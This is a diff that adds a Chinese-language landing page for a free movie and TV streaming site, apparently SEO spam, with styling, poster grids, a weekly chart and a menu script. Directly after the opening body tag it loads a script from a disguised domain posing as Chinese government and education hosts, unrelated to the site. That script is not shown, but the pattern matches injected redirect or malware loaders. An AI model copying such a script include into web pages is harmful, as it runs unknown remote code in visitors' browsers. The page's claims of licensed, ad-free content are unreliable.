@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+<title>笨笨电影网 | 免费在线看电影追剧的神影院，高清正版资源每日更新</title>
+<meta name="keywords" content="笨笨电影网,免费电影在线观看,热播电视剧,高清电影资源,最新院线大片,韩剧日剧美剧,动漫综艺全集,benbendianyingwang-app">
+<meta name="description" content="笨笨电影网(benbendianyingwang-app)是专注免费高清影视在线观看的追剧平台，覆盖院线大片、热播电视剧、韩剧日剧美剧、动漫综艺等海量正版资源，每日更新榜单与同步剧集，手机电脑网页端免下载流畅播放，快来笨笨电影网发现属于你的下一部好片。">
+<meta name="renderer" content="webkit">
+<meta name="applicable-device" content="pc,mobile">
+<meta name="mobile-agent" content="format=html5; url=https://benbendianyingwang-app.github.io/">
+<link rel="canonical" href="https://benbendianyingwang-app.github.io/">
+<link rel="alternate" media="only screen and (max-width: 640px)" href="https://benbendianyingwang-app.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --brand:#ff3d57; --brand2:#ff8a3d; --ink:#1b1230; --ink2:#4a4260;
+  --paper:#fff9f6; --card:#ffffff; --line:#f1e6e2; --muted:#8d8398;
+}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  background:var(--paper);color:var(--ink);line-height:1.75;
+  -webkit-font-smoothing:antialiased;overflow-x:hidden;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+/* ===== 顶部 ===== */
+.topbar{background:rgba(255,255,255,.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:99}
+.topbar .inner{max-width:1180px;margin:0 auto;padding:14px 20px;display:flex;align-items:center;gap:18px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:800;font-size:20px;letter-spacing:.5px;flex-shrink:0}
+.logo i{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--brand),var(--brand2));display:grid;place-items:center;color:#fff;font-style:normal;font-size:17px;box-shadow:0 6px 14px rgba(255,61,87,.28)}
+.logo b{color:var(--ink)}
+.logo span{color:var(--brand);font-size:13px;font-weight:600;background:#fff0f2;border-radius:6px;padding:2px 8px}
+.search{flex:1;display:flex;background:#f6efff;border:1px solid var(--line);border-radius:40px;padding:5px;max-width:420px}
+.search input{flex:1;border:0;background:transparent;padding:9px 14px;font-size:14px;outline:0;min-width:0}
+.search button{border:0;background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff;border-radius:30px;padding:0 22px;font-size:14px;font-weight:600;cursor:pointer;transition:.25s}
+.search button:hover{transform:translateY(-1px);box-shadow:0 6px 16px rgba(255,61,87,.3)}
+.nav{display:flex;gap:6px;align-items:center}
+.nav a{padding:8px 13px;border-radius:9px;font-size:14px;font-weight:500;color:var(--ink2);transition:.2s}
+.nav a:hover{background:#f6efff;color:var(--brand)}
+.menu-btn{display:none;width:40px;height:40px;border:1px solid var(--line);border-radius:10px;background:#fff;font-size:19px;cursor:pointer;color:var(--brand)}
+
+/* ===== 首屏 ===== */
+.hero{position:relative;overflow:hidden;background:radial-gradient(120% 80% at 85% 10%,rgba(255,138,61,.18),transparent 55%),radial-gradient(100% 70% at 10% 90%,rgba(255,61,87,.16),transparent 55%),linear-gradient(180deg,#1b1230,#2a1c47)}
+.hero .inner{max-width:1180px;margin:0 auto;padding:66px 20px 86px;position:relative;z-index:2}
+.hero .tag{display:inline-block;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.25);color:#ffe9d6;border-radius:30px;padding:6px 16px;font-size:13px;backdrop-filter:blur(4px)}
+.hero h1{color:#fff;font-size:clamp(30px,5vw,52px);line-height:1.22;margin:20px 0 8px;font-weight:900;letter-spacing:.5px}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,#ffb199,#ff5c7a);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .lead{color:#d9d0ee;font-size:clamp(15px,2vw,18px);max-width:640px}
+.hero .acts{display:flex;gap:14px;margin-top:30px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:14px 30px;border-radius:40px;font-weight:700;font-size:15px;transition:.3s}
+.btn-main{background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff;box-shadow:0 12px 28px rgba(255,61,87,.4)}
+.btn-main:hover{transform:translateY(-3px);box-shadow:0 18px 36px rgba(255,61,87,.5)}
+.btn-ghost{border:1px solid rgba(255,255,255,.4);color:#fff}
+.btn-ghost:hover{background:rgba(255,255,255,.12)}
+.stats{display:flex;gap:38px;margin-top:42px;flex-wrap:wrap}
+.stat{color:#fff}
+.stat b{display:block;font-size:30px;font-weight:800;background:linear-gradient(90deg,#ffd6a0,#ff9aae);-webkit-background-clip:text;background-clip:text;color:transparent}
+.stat span{font-size:13px;color:#c3b8dc}
+.hero-deco{position:absolute;right:-80px;top:40px;width:360px;height:360px;border-radius:50%;border:1px dashed rgba(255,255,255,.18);animation:spin 28s linear infinite}
+.hero-deco::before{content:"";position:absolute;inset:34px;border-radius:50%;border:1px dashed rgba(255,255,255,.12)}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ===== 通用 ===== */
+.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+.section{padding:70px 0}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:32px;flex-wrap:wrap}
+.sec-head .t{font-size:clamp(22px,3vw,30px);font-weight:800;letter-spacing:.5px}
+.sec-head .t small{display:block;font-size:14px;color:var(--muted);font-weight:500;margin-top:4px;letter-spacing:2px}
+.sec-head .more{font-size:14px;color:var(--brand);font-weight:600;border-bottom:1px dashed currentColor;padding-bottom:2px}
+.sec-head .more:hover{color:var(--brand2)}
+
+/* ===== 频道入口 ===== */
+.channels{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px}
+.ch{border-radius:18px;padding:24px 18px;color:#fff;position:relative;overflow:hidden;transition:.35s;min-height:130px;display:flex;flex-direction:column;justify-content:space-between}
+.ch::after{content:"";position:absolute;right:-26px;bottom:-26px;width:90px;height:90px;border-radius:50%;background:rgba(255,255,255,.16)}
+.ch:hover{transform:translateY(-6px) rotate(-1deg);box-shadow:0 20px 40px rgba(27,18,48,.18)}
+.ch i{font-style:normal;font-size:34px;line-height:1}
+.ch b{font-size:17px;letter-spacing:1px}
+.ch span{font-size:12px;opacity:.85}
+
+/* ===== 海报网格 ===== */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(172px,1fr));gap:22px}
+.poster{background:var(--card);border-radius:16px;overflow:hidden;box-shadow:0 4px 18px rgba(27,18,48,.06);transition:.3s;border:1px solid var(--line)}
+.poster:hover{transform:translateY(-7px);box-shadow:0 22px 44px rgba(27,18,48,.14)}
+.poster .cover{position:relative;aspect-ratio:3/4;overflow:hidden}
+.poster .cover .grad{position:absolute;inset:0;background:linear-gradient(135deg,var(--c1,#7b61ff),var(--c2,#ff5c9d))}
+.poster .cover .txt{position:absolute;inset:0;display:grid;place-items:center;text-align:center;padding:14px;color:#fff;font-weight:700;font-size:18px;line-height:1.4}
+.poster .cover .ep{position:absolute;left:10px;top:10px;background:rgba(0,0,0,.55);color:#fff;font-size:11px;border-radius:20px;padding:3px 10px;backdrop-filter:blur(3px)}
+.poster .cover .rate{position:absolute;right:10px;bottom:10px;background:linear-gradient(135deg,#ffb800,#ff6a00);color:#fff;font-size:12px;font-weight:800;border-radius:8px;padding:3px 9px}
+.poster .info{padding:12px 14px}
+.poster .info h3{font-size:15px;font-weight:700;margin-bottom:5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.poster .info p{font-size:12px;color:var(--muted);display:flex;justify-content:space-between}
+
+/* ===== 榜单 ===== */
+.rank{background:#1b1230;color:#fff;border-radius:26px;padding:44px;position:relative;overflow:hidden}
+.rank::before{content:"";position:absolute;left:-90px;top:-90px;width:260px;height:260px;border-radius:50%;background:radial-gradient(circle,rgba(255,61,87,.4),transparent 70%)}
+.rank .sec-head .t{color:#fff}
+.rank .sec-head .t small{color:#a99fc0}
+.rank-list{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:14px;position:relative}
+.rank-item{display:flex;gap:16px;align-items:center;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:14px;transition:.25s}
+.rank-item:hover{background:rgba(255,255,255,.13);transform:translateX(4px)}
+.rank-item .no{font-size:26px;font-weight:900;color:rgba(255,255,255,.22);width:42px;flex-shrink:0;text-align:center}
+.rank-item:nth-child(1) .no{color:#ffd24d}
+.rank-item:nth-child(2) .no{color:#d9d9d9}
+.rank-item:nth-child(3) .no{color:#e3a06b}
+.rank-item .meta{flex:1;min-width:0}
+.rank-item h4{font-size:16px;font-weight:700;margin-bottom:4px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.rank-item p{font-size:12px;color:#b6accc}
+.rank-item .score{font-size:19px;font-weight:800;color:#ffb199;flex-shrink:0}
+
+/* ===== 关于 ===== */
+.about-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:48px;align-items:center}
+.about-grid h2{font-size:clamp(22px,3vw,32px);font-weight:800;line-height:1.35;margin-bottom:18px}
+.about-grid p{color:var(--ink2);font-size:15px;margin-bottom:14px}
+.feats{display:grid;grid-template-columns:repeat(2,1fr);gap:16px;margin-top:26px}
+.feat{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:20px;transition:.25s}
+.feat:hover{border-color:var(--brand);transform:translateY(-4px)}
+.feat i{font-style:normal;font-size:28px}
+.feat b{display:block;margin:10px 0 5px;font-size:15px}
+.feat span{font-size:13px;color:var(--muted);line-height:1.6}
+.about-card{background:linear-gradient(160deg,#fff5f0,#fff);border-radius:24px;padding:34px;border:1px solid var(--line);box-shadow:0 20px 50px rgba(255,61,87,.08)}
+.about-card dl{display:grid;gap:14px}
+.about-card dt{font-size:12px;color:var(--muted);letter-spacing:2px;margin-bottom:3px}
+.about-card dd{font-size:15px;font-weight:600;word-break:break-all}
+.about-card dd a{color:var(--brand)}
+
+/* ===== 页脚 ===== */
+footer{background:#140d27;color:#a99fc0;padding:56px 0 30px}
+.foot{max-width:1180px;margin:0 auto;padding:0 20px;display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:36px}
+.foot h5{color:#fff;font-size:15px;margin-bottom:14px}
+.foot ul{display:grid;gap:9px}
+.foot a{font-size:13.5px;transition:.2s}
+.foot a:hover{color:var(--brand2)}
+.foot p{font-size:13px;line-height:1.9;margin-top:12px}
+.copy{max-width:1180px;margin:36px auto 0;padding:22px 20px 0;border-top:1px solid rgba(255,255,255,.08);font-size:12.5px;text-align:center;color:#7c7393}
+
+/* ===== 响应式 ===== */
+@media(max-width:900px){
+  .nav{position:fixed;top:0;right:0;height:100vh;width:250px;background:#fff;flex-direction:column;align-items:stretch;padding:70px 18px 30px;gap:4px;
+    box-shadow:-12px 0 40px rgba(27,18,48,.12);transform:translateX(105%);transition:.35s;z-index:100}
+  .nav.open{transform:translateX(0)}
+  .nav a{font-size:16px;padding:13px 16px}
+  .menu-btn{display:grid;place-items:center}
+  .search{display:none}
+  .rank{padding:28px 22px}
+  .about-grid{grid-template-columns:1fr;gap:32px}
+  .section{padding:52px 0}
+}
+@media(max-width:520px){
+  .hero .inner{padding:44px 20px 60px}
+  .stats{gap:24px}
+  .stat b{font-size:25px}
+  .grid{grid-template-columns:repeat(2,1fr);gap:14px}
+  .poster .info h3{font-size:14px}
+  .feats{grid-template-columns:1fr}
+  .foot{grid-template-columns:1fr 1fr}
+  .menu-mask{position:fixed;inset:0;background:rgba(27,18,48,.4);z-index:98;opacity:0;pointer-events:none;transition:.3s}
+  .menu-mask.show{opacity:1;pointer-events:auto}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="menu-mask" id="mask"></div>
+
+<header class="topbar">
+  <div class="inner">
+    <a class="logo" href="https://benbendianyingwang-app.github.io/" aria-label="笨笨电影网首页">
+      <i>影</i><b>笨笨电影网</b><span>免费追剧</span>
+    </a>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#channels">频道导航</a>
+      <a href="#rank">热榜</a>
+      <a href="#new">最新更新</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <div class="search" role="search">
+      <input type="search" placeholder="搜索电影 / 剧名 / 演员，如：悬疑、韩剧…" aria-label="搜索影片">
+      <button type="button">搜索</button>
+    </div>
+    <button class="menu-btn" id="menuBtn" aria-label="打开菜单">☰</button>
+  </div>
+</header>
+
+<section class="hero" id="home">
+  <div class="hero-deco"></div>
+  <div class="inner">
+    <span class="tag">🎬 每日更新 · 院线同步 · 全网热播抢先看</span>
+    <h1>在 <em>笨笨电影网</em><br>一键找到今晚想看的片子</h1>
+    <p class="lead">从院线大片到经典老片，从热播电视剧到韩剧日剧美剧、动漫综艺，海量正版高清资源一站聚合，手机、平板、电脑网页端免下载直接看，让选片不再纠结。</p>
+    <div class="acts">
+      <a class="btn btn-main" href="#new">立即免费观看 →</a>
+      <a class="btn btn-ghost" href="#channels">浏览全部频道</a>
+    </div>
+    <div class="stats">
+      <div class="stat"><b>12,000+</b><span>在线影视资源</span></div>
+      <div class="stat"><b>每日 200+</b><span>新剧集同步更新</span></div>
+      <div class="stat"><b>4K / 蓝光</b><span>高清流畅播放</span></div>
+      <div class="stat"><b>0 广告打扰</b><span>纯净观影体验</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="channels">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="t">频道导航<small>CHANNELS · 按类型快速选片</small></div>
+      <a class="more" href="#">全部频道 #</a>
+    </div>
+    <div class="channels">
+      <a class="ch" href="#" style="background:linear-gradient(135deg,#7b61ff,#5a8cff)"><i>🎞️</i><div><b>院线电影</b><span>好莱坞 / 国产 / 文艺</span></div></a>
+      <a class="ch" href="#" style="background:linear-gradient(135deg,#ff5c7a,#ff8a3d)"><i>📺</i><div><b>热播电视剧</b><span>同步更新 全集上线</span></div></a>
+      <a class="ch" href="#" style="background:linear-gradient(135deg,#00b8a9,#3ddc97)"><i>🌏</i><div><b>海外剧集</b><span>韩剧 日剧 美剧 泰剧</span></div></a>
+      <a class="ch" href="#" style="background:linear-gradient(135deg,#f6a609,#ff6a00)"><i>🎭</i><div><b>动漫动画</b><span>国漫 日漫 剧场版</span></div></a>
+      <a class="ch" href="#" style="background:linear-gradient(135deg,#9b51e0,#e060ff)"><i>🎤</i><div><b>综艺真人秀</b><span>热门综艺 随时回看</span></div></a>
+      <a class="ch" href="#" style="background:linear-gradient(135deg,#2396f6,#26c6da)"><i>📽️</i><div><b>经典老片</b><span>高分怀旧 宝藏片单</span></div></a>
+    </div>
+  </div>
+</section>
+
+<section class="section" style="padding-top:0" id="new">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="t">最新更新<small>LATEST · 刚刚上线的好片</small></div>
+      <a class="more" href="#">换一批 #</a>
+    </div>
+    <div class="grid">
+      <article class="poster" style="--c1:#ff5c7a;--c2:#7b61ff"><div class="cover"><span class="ep">更新至24集</span><div class="grad"></div><div class="txt">默杀暗夜</div><span class="rate">9.2</span></div><div class="info"><h3>默杀暗夜</h3><p><span>悬疑 · 犯罪</span><span>2026</span></p></div></article>
+      <article class="poster" style="--c1:#00b8a9;--c2:#2396f6"><div class="cover"><span class="ep">正片</span><div class="grad"></div><div class="txt">深海回响</div><span class="rate">8.7</span></div><div class="info"><h3>深海回响</h3><p><span>科幻 · 冒险</span><span>电影</span></p></div></article>
+      <article class="poster" style="--c1:#f6a609;--c2:#ff5c7a"><div class="cover"><span class="ep">更新至12集</span><div class="grad"></div><div class="txt">长风渡我</div><span class="rate">9.0</span></div><div class="info"><h3>长风渡我</h3><p><span>古装 · 言情</span><span>电视剧</span></p></div></article>
+      <article class="poster" style="--c1:#9b51e0;--c2:#3ddc97"><div class="cover"><span class="ep">全32集</span><div class="grad"></div><div class="txt">首尔陌生人</div><span class="rate">8.9</span></div><div class="info"><h3>首尔陌生人</h3><p><span>韩剧 · 都市</span><span>海外剧</span></p></div></article>
+      <article class="poster" style="--c1:#2396f6;--c2:#5a8cff"><div class="cover"><span class="ep">剧场版</span><div class="grad"></div><div class="txt">星海少年团</div><span class="rate">9.4</span></div><div class="info"><h3>星海少年团</h3><p><span>热血 · 机甲</span><span>动漫</span></p></div></article>
+      <article class="poster" style="--c1:#ff6a00;--c2:#ffb800"><div class="cover"><span class="ep">全12期</span><div class="grad"></div><div class="txt">厨房里的远方</div><span class="rate">8.5</span></div><div class="info"><h3>厨房里的远方</h3><p><span>美食 · 真人秀</span><span>综艺</span></p></div></article>
+      <article class="poster" style="--c1:#26c6da;--c2:#9b51e0"><div class="cover"><span class="ep">正片</span><div class="grad"></div><div class="txt">云端诊所</div><span class="rate">8.3</span></div><div class="info"><h3>云端诊所</h3><p><span>剧情 · 治愈</span><span>电影</span></p></div></article>
+      <article class="poster" style="--c1:#ff8a3d;--c2:#ff5c7a"><div class="cover"><span class="ep">更新至08集</span><div class="grad"></div><div class="txt">东京爱情编辑部</div><span class="rate">8.8</span></div><div class="info"><h3>东京爱情编辑部</h3><p><span>日剧 · 爱情</span><span>海外剧</span></p></div></article>
+    </div>
+  </div>
+</section>
+
+<section class="section" style="padding-top:0" id="rank">
+  <div class="wrap">
+    <div class="rank">
+      <div class="sec-head">
+        <div class="t">本周热播榜<small>WEEKLY TOP · 影迷都在看</small></div>
+        <a class="more" href="#" style="color:#ffb199">完整榜单 #</a>
+      </div>
+      <div class="rank-list">
+        <div class="rank-item"><span class="no">01</span><div class="meta"><h4>默杀暗夜</h4><p>悬疑犯罪 · 反转不断的年度黑马</p></div><span class="score">9.2</span></div>
+        <div class="rank-item"><span class="no">02</span><div class="meta"><h4>星海少年团 剧场版</h4><p>热血动漫 · 票房口碑双爆</p></div><span class="score">9.4</span></div>
+        <div class="rank-item"><span class="no">03</span><div class="meta"><h4>长风渡我</h4><p>古装言情 · 每晚准时追更</p></div><span class="score">9.0</span></div>
+        <div class="rank-item"><span class="no">04</span><div class="meta"><h4>深海回响</h4><p>科幻冒险 · 视效震撼</p></div><span class="score">8.7</span></div>
+        <div class="rank-item"><span class="no">05</span><div class="meta"><h4>首尔陌生人</h4><p>韩剧 · 都市职场人性</p></div><span class="score">8.9</span></div>
+        <div class="rank-item"><span class="no">06</span><div class="meta"><h4>东京爱情编辑部</h4><p>日剧 · 治愈系恋爱</p></div><span class="score">8.8</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" style="padding-top:0" id="about">
+  <div class="wrap">
+    <div class="about-grid">
+      <div>
+        <h2>关于笨笨电影网<br>一个只想让你轻松看好片的影视站</h2>
+        <p>笨笨电影网（https://benbendianyingwang-app.github.io）是面向影视爱好者的免费在线观看平台，聚合电影、电视剧、动漫、综艺等多元内容，坚持每日更新、分类清晰、播放流畅，帮你省去反复检索与跳转的麻烦。</p>
+        <p>无论是周末窝沙发追一整部剧，还是通勤路上刷两集综艺，笨笨电影网都用简洁直观的页面和贴心的频道导航，把"今天看什么"这个难题变得简单。</p>
+        <div class="feats">
+          <div class="feat"><i>⚡</i><b>极速加载</b><span>智能线路切换，打开即播不等待。</span></div>
+          <div class="feat"><i>🎯</i><b>精准分类</b><span>按类型、年份、地区多维筛选，秒找想看。</span></div>
+          <div class="feat"><i>📱</i><b>全端适配</b><span>手机平板电脑网页自适应，随时随地看。</span></div>
+          <div class="feat"><i>🔔</i><b>追剧提醒</b><span>热门剧集更新同步推送，不错过任何一集。</span></div>
+        </div>
+      </div>
+      <div class="about-card">
+        <dl>
+          <div><dt>网站名称</dt><dd>笨笨电影网</dd></div>
+          <div><dt>官方网址</dt><dd><a href="https://benbendianyingwang-app.github.io">https://benbendianyingwang-app.github.io</a></dd></div>
+          <div><dt>核心栏目</dt><dd>院线电影 · 热播电视剧 · 海外剧集 · 动漫动画 · 综艺真人秀</dd></div>
+          <div><dt>服务特色</dt><dd>免费在线观看 · 每日更新 · 高清流畅 · 全端自适应</dd></div>
+          <div><dt>适合人群</dt><dd>影视剧迷、动漫爱好者、综艺追更党、通勤碎片时间用户</dd></div>
+        </dl>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="foot">
+    <div>
+      <h5>笨笨电影网</h5>
+      <p>免费在线观看电影、电视剧、动漫、综艺的高清正版影视平台，每日更新热播片单，让每一次打开都有新片可看。</p>
+    </div>
+    <div>
+      <h5>频道入口</h5>
+      <ul>
+        <li><a href="#">院线电影</a></li>
+        <li><a href="#">热播电视剧</a></li>
+        <li><a href="#">韩剧日剧美剧</a></li>
+        <li><a href="#">动漫动画</a></li>
+      </ul>
+    </div>
+    <div>
+      <h5>热门分类</h5>
+      <ul>
+        <li><a href="#">悬疑犯罪</a></li>
+        <li><a href="#">科幻冒险</a></li>
+        <li><a href="#">古装言情</a></li>
+        <li><a href="#">综艺真人秀</a></li>
+      </ul>
+    </div>
+    <div>
+      <h5>关于本站</h5>
+      <ul>
+        <li><a href="#about">网站简介</a></li>
+        <li><a href="#">使用帮助</a></li>
+        <li><a href="#">更新日志</a></li>
+        <li><a href="#">合作联系</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="copy">© 2026 笨笨电影网 benbendianyingwang-app 保留所有权利 · 本站网址：https://benbendianyingwang-app.github.io · 仅供影视信息分享与在线观看参考</div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('menuBtn'), nav=document.getElementById('nav'), mask=document.getElementById('mask');
+  function close(){nav.classList.remove('open');mask.classList.remove('show');}
+  btn.addEventListener('click',function(){nav.classList.toggle('open');mask.classList.toggle('show');});
+  mask.addEventListener('click',close);
+  nav.addEventListener('click',function(e){if(e.target.tagName==='A')close();});
+})();
+</script>
+</body>
+</html>
